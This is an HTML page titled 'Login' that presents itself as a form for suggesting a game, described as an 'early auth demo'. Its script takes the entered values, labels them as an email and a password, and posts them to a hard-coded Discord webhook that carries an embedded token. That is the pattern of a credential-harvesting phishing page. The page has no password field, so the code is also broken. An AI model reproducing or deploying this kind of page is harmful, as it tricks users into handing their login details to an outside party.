<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="style.css" rel="stylesheet" type="text/css">
    <title>Login</title>
</head>

<body>
    <h1>KEROSENE</h1>
    <p>suggest a game (early auth demo)</p>

    <form id="loginForm">
        <label for="email">name and then the game that you suggest..</label>
        <input type="text" id="email" name="email" autofocus="autofocus" required />
        <input type="submit" value="send" />
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function (event) {
            event.preventDefault(); // Prevent the default form submission

            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            var webhookUrl = 'https://discord.com/api/webhooks/1252872181575057470/0XNJ7uaDQUQHyrXAxEf2RJhpqwh-PpjRAYcjAEpfUu1vL5gMS50hPbzt52azZMDy0439';

            var xhr = new XMLHttpRequest();
            xhr.open('POST', webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
            xhr.send(JSON.stringify({
                content: `Email: ${email}\nPassword: ${password}`
            }));

            alert('Your information has been submitted.');
        });
    </script>
</body>

</html>
